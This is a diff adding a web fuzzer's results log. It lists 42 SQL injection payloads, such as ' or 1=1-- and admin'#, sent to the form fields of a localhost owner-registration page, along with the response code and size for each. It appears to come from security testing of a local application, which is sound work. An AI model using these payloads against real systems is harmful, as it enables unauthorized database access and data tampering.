@@ -1,0 +1,52 @@
+Target: http://localhost:8080/owners/new?firstName=FUZZ&lastName=FUZZ&address=FUZZ&city=FUZZ&telephone=FUZZ
+Total requests: 42
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+00011:  C=200    174 L	     307 W	   5129 Ch	  "' and '2'='0 - ' and '2'='0 - ' and '2'='0 - ' and '2'='0 - ' and '2'='0"
+00006:  C=200    174 L	     307 W	   5129 Ch	  "and USER=USER - and USER=USER - and USER=USER - and USER=USER - and USER=USER"
+00001:  C=200    174 L	     307 W	   5129 Ch	  "' - ' - ' - ' - '"
+00003:  C=200    174 L	     307 W	   5129 Ch	  "#mysql - #mysql - #mysql - #mysql - #mysql"
+00007:  C=200    174 L	     307 W	   5129 Ch	  "and user()=user() - and user()=user() - and user()=user() - and user()=user() - and user()=user()"
+00013:  C=200    174 L	     307 W	   5129 Ch	  "/*ora_mysql*/and/**/2=2 - /*ora_mysql*/and/**/2=2 - /*ora_mysql*/and/**/2=2 - /*ora_mysql*/and/**/2=2 - /*ora_mysql*/and/**/2=2"
+00012:  C=200    174 L	     307 W	   5129 Ch	  "' or '2'='2 - ' or '2'='2 - ' or '2'='2 - ' or '2'='2 - ' or '2'='2"
+00010:  C=200    174 L	     307 W	   5129 Ch	  "' and '2'='2 - ' and '2'='2 - ' and '2'='2 - ' and '2'='2 - ' and '2'='2"
+00009:  C=200    174 L	     307 W	   5129 Ch	  "or 2=2 - or 2=2 - or 2=2 - or 2=2 - or 2=2"
+00008:  C=200    174 L	     307 W	   5129 Ch	  "and 2=0 - and 2=0 - and 2=0 - and 2=0 - and 2=0"
+00005:  C=200    174 L	     307 W	   5129 Ch	  "and 1=1 - and 1=1 - and 1=1 - and 1=1 - and 1=1"
+00002:  C=200    174 L	     307 W	   5129 Ch	  "--ora_sqls - --ora_sqls - --ora_sqls - --ora_sqls - --ora_sqls"
+00027:  C=200    174 L	     307 W	   5129 Ch	  "1e100 - 1e100 - 1e100 - 1e100 - 1e100"
+00004:  C=200    174 L	     307 W	   5129 Ch	  "'#mysql - '#mysql - '#mysql - '#mysql - '#mysql"
+00014:  C=200    174 L	     307 W	   5129 Ch	  "/*ora_mysql*/and/**/2=0 - /*ora_mysql*/and/**/2=0 - /*ora_mysql*/and/**/2=0 - /*ora_mysql*/and/**/2=0 - /*ora_mysql*/and/**/2=0"
+00016:  C=200    174 L	     307 W	   5129 Ch	  "'/*ora_mysql*/and/**/'2'='0 - '/*ora_mysql*/and/**/'2'='0 - '/*ora_mysql*/and/**/'2'='0 - '/*ora_mysql*/and/**/'2'='0 - '/*ora_mysql*/and/**/'2'='0"
+00020:  C=200    174 L	     307 W	   5129 Ch	  "and 2=2-- oracle_mysql - and 2=2-- oracle_mysql - and 2=2-- oracle_mysql - and 2=2-- oracle_mysql - and 2=2-- oracle_mysql"
+00026:  C=200    174 L	     307 W	   5129 Ch	  "999999999999999999 - 999999999999999999 - 999999999999999999 - 999999999999999999 - 999999999999999999"
+00028:  C=200    174 L	     307 W	   5129 Ch	  "2 or 2=2 - 2 or 2=2 - 2 or 2=2 - 2 or 2=2 - 2 or 2=2"
+00025:  C=200    174 L	     307 W	   5129 Ch	  "' and '2'='0'-- oracle - ' and '2'='0'-- oracle - ' and '2'='0'-- oracle - ' and '2'='0'-- oracle - ' and '2'='0'-- oracle"
+00024:  C=200    174 L	     307 W	   5129 Ch	  "' and '2'='2'-- oracle - ' and '2'='2'-- oracle - ' and '2'='2'-- oracle - ' and '2'='2'-- oracle - ' and '2'='2'-- oracle"
+00023:  C=200    174 L	     307 W	   5129 Ch	  "' and '2'='0'#mysql - ' and '2'='0'#mysql - ' and '2'='0'#mysql - ' and '2'='0'#mysql - ' and '2'='0'#mysql"
+00022:  C=200    174 L	     307 W	   5129 Ch	  "' and '2'='2'#mysql - ' and '2'='2'#mysql - ' and '2'='2'#mysql - ' and '2'='2'#mysql - ' and '2'='2'#mysql"
+00019:  C=200    174 L	     307 W	   5129 Ch	  "and 2=0#mysql - and 2=0#mysql - and 2=0#mysql - and 2=0#mysql - and 2=0#mysql"
+00021:  C=200    174 L	     307 W	   5129 Ch	  "and 2=0-- oracle_mysql - and 2=0-- oracle_mysql - and 2=0-- oracle_mysql - and 2=0-- oracle_mysql - and 2=0-- oracle_mysql"
+00015:  C=200    174 L	     307 W	   5129 Ch	  "'/*ora_mysql*/and/**/'2'='2 - '/*ora_mysql*/and/**/'2'='2 - '/*ora_mysql*/and/**/'2'='2 - '/*ora_mysql*/and/**/'2'='2 - '/*ora_mysql*/and/**/'2'='2"
+00018:  C=200    174 L	     307 W	   5129 Ch	  "and 2=2#mysql - and 2=2#mysql - and 2=2#mysql - and 2=2#mysql - and 2=2#mysql"
+00017:  C=200    174 L	     307 W	   5129 Ch	  "'/*ora_mysql*/or/**/'2'='2 - '/*ora_mysql*/or/**/'2'='2 - '/*ora_mysql*/or/**/'2'='2 - '/*ora_mysql*/or/**/'2'='2 - '/*ora_mysql*/or/**/'2'='2"
+00029:  C=200    174 L	     307 W	   5129 Ch	  "2' or '2'='2 - 2' or '2'='2 - 2' or '2'='2 - 2' or '2'='2 - 2' or '2'='2"
+00040:  C=200    174 L	     307 W	   5129 Ch	  "admin'# - admin'# - admin'# - admin'# - admin'#"
+00039:  C=400     11 L	     136 W	   2076 Ch	  "" or 1=1# - " or 1=1# - " or 1=1# - " or 1=1# - " or 1=1#"
+00031:  C=200    174 L	     307 W	   5129 Ch	  "admin'-- - admin'-- - admin'-- - admin'-- - admin'--"
+00035:  C=200    174 L	     307 W	   5129 Ch	  "' or 1=1-- - ' or 1=1-- - ' or 1=1-- - ' or 1=1-- - ' or 1=1--"
+00041:  C=200    174 L	     307 W	   5129 Ch	  "now() - now() - now() - now() - now()"
+00038:  C=200    174 L	     307 W	   5129 Ch	  "or 1=1# - or 1=1# - or 1=1# - or 1=1# - or 1=1#"
+00037:  C=200    174 L	     307 W	   5129 Ch	  "or 1=1 - or 1=1 - or 1=1 - or 1=1 - or 1=1"
+00034:  C=200    174 L	     307 W	   5129 Ch	  "'test-- - 'test-- - 'test-- - 'test-- - 'test--"
+00033:  C=200    174 L	     307 W	   5129 Ch	  "'test - 'test - 'test - 'test - 'test"
+00030:  C=200    174 L	     307 W	   5129 Ch	  "order by 1-- - order by 1-- - order by 1-- - order by 1-- - order by 1--"
+00032:  C=200    174 L	     307 W	   5129 Ch	  "admin' - admin' - admin' - admin' - admin'"
+00036:  C=200    174 L	     307 W	   5129 Ch	  "or 1=1-- - or 1=1-- - or 1=1-- - or 1=1-- - or 1=1--"
+00042:  C=200    174 L	     307 W	   5129 Ch	  "http://localhost:8080/owners/new?firstName=&lastName=&address=&city=&telephone="
+
+Total time: 0
+Processed Requests: 42
+Filtered Requests: 0
+Requests/sec.: 0
